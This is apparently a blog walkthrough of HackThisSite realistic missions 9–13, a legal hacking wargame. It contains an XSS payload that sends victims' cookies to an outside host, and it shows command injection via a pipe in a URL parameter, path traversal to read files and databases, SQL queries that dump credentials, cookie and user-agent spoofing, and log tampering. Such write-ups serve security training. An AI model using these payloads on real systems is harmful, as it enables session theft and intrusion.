---
layout: post
title: HackThisSite - Realistic Missions - Part 2
categories: [Vulnerable Web Applications]
tags: [HackThisSite]

---

This is the second part of realistic missions created to be exactly like situations you may face in the real world. 

### LEVEL9
Login with the credentials, then we see interesting cookies that we can steal (XSS injection). Going to https://www.hackthissite.org/missions/realistic/9/pm.php, we can send a message to m-crap (owner) and with this message: javascript:void(window.location='http://hello.com/getcookies.php?'+document.cookie);
Then, we can see: "It's beyond the scope of this mission to check the XSS". And we change the cookies:
strUsername=m-crap%40crappysoft.com; strPassword=94a35a3b7befff5eb2a8415af04aa16c; intID=1;
and pay.
Right now, we need to clean the logs. We need to find out if there's an option to delete something in any section -> https://www.hackthissite.org/missions/realistic/9/index.php?pages=mailing (Note: This adds your email to the list, and at the same time, checks the list for anything without the '@' character and deletes it).  We see a path to a txt file -> ./files/mailinglist/addresses.txt,  going to previous directories: ./files we find the directory logs. So we change with inspect element that directory by the ./files/logs/logs.txt and then submit it.

### LEVEL10:
In the main page we see: <.a href="staff.php"> where asks to log in as a teacher. In the section, we see a list of teachers and we try to do bruteforce:
username: smiller
password: smiller

And we got this message:
"Welcome, Mrs. Samantha Miller! Please remember that access to the staff administration area is restricted to the district-supplied ‘holy_teacher’ web browser."

Then, we need to change the user-agent to ‘holy_teacher’ and the admin cookie to 1. Finally, we can change grades.

### LEVEL11:
https://www.hackthissite.org/missions/realistic/11/page.pl?page=main -> https://www.hackthissite.org/missions/realistic/11/page.pl?page=|ls|
-> looking through directories, we find this one: https://www.hackthissite.org/missions/realistic/11/client_http_docs/, looking at the sections,we can see the most interesting one: https://www.hackthissite.org/missions/realistic/11/client_http_docs/therightwayradio/?page=main looking at the post, we see that we can modify the id: https://www.hackthissite.org/missions/realistic/11/client_http_docs/therightwayradio/?page=userinfo&id=-1 -> https://www.hackthissite.org/missions/realistic/11/client_http_docs/therightwayradio/?page=userinfo&id=0 we can edit the account (so we can log in to the page with the pass we want) -> https://www.hackthissite.org/missions/realistic/11/client_http_docs/therightwayradio/?page=mod this is the Mod Panel: "SQLite access for moderators has been tightened to read-only due to the recent security breech".
Using the inspect element, we can see this part <.input type="hidden" name="sql_db" value="rwr.dbase"> and we can change the value to ../../../bs.dbase.

Taking into account that it is sqlite we can write as input the following query: SELECT * FROM sqlite_master, as result it shows us a table.  In order to see what it contains, we'll use:  SELECT * FROM web_hosting where we find the admin credentials to log in at https://www.hackthissite.org/missions/realistic/11/admin. 

When we see the table, there is a download section which gives us the url https://www.hackthissite.org/missions/realistic/11/admin/d.pl?file=/var/www/budgetserv/html/client_http_docs/wonderdiet/index.html so we have to modify it:  https://www.hackthissite.org/missions/realistic/11/admin/d.pl?file=/var/www/budgetserv/html/client_http_docs/space46/src.tar.gz


### LEVEL12: 
We get an field to put an address, we try to put file://c:/ -> https://www.hackthissite.org/missions/realistic/12/cgi-bin/internet.pl?url=file%3A%2F%2Fc%3A%2F where we have different directories. Then, using file://c:/WEB/HTML we found a new file (heartlandadminpanel.html) where it's a [login page](https://www.hackthissite.org/missions/realistic/12/heartlandadminpanel.html). 

We check in all sections of the page, which directories can also be used as input: view-source:https://www.hackthissite.org/missions/realistic/12/jsimons/guest.html writing anything the page will direct us to: https://www.hackthissite.org/missions/realistic/12/cgi-bin/guest.pl?action=read&file=guestbook.txt
we modify the file: https://www.hackthissite.org/missions/realistic/12/cgi-bin/guest.pl?action=read&file=heartlandadminpanel.pl where it shows us the credentials in the view-source: $ENV{QUERY_STRING} =~ /^username=jbardus&password=heartlandnetworkadministrator&blocked=/) and then, clean everything.

### LEVEL13: 
We see all the sections that it has to see which could be useful to us. https://www.hackthissite.org/missions/realistic/13/speeches2.php indicates 'This speech is still being edited, as it had many errors because of our ex-typist', it may be interesting. We can see the warnings (errors) looking at the view-source or adding a '?' at the end of the url: https://www.hackthissite.org/missions/realistic/13/speeches2.php?
The following md5 is shown: 21232f297a57a5a743894a0e4a801fc3 that decrypting it gives us 'admin' as a result.

In the url https://www.hackthissite.org/missions/realistic/13/readpress.php we also observed this pass:
$in = "GET /speeches/passwords/" . md5('Speeches') . ""; Speeches encrypted in md5: 7e40c181f9221f9c613adf8bb8136ea8
and go to the directory it indicates: https://www.hackthissite.org/missions/realistic/13/speeches/passwords/7e40c181f9221f9c613adf8bb8136ea8/
where a directory with this content appears: 7bc35830abab8fced52657d38ea048df:21232f297a57a5a743894a0e4a801fc3
and we get moni1:admin. We need to know where we can login, we try with https://www.hackthissite.org/missions/realistic/13/admin/ using the credentials it tells us that "admin" does not match password for "moni1" so we try to put the admin as md5 and then log in: https://www.hackthissite.org/missions/realistic/13/21232f297a57a5a743894a0e4a801fc3/ 
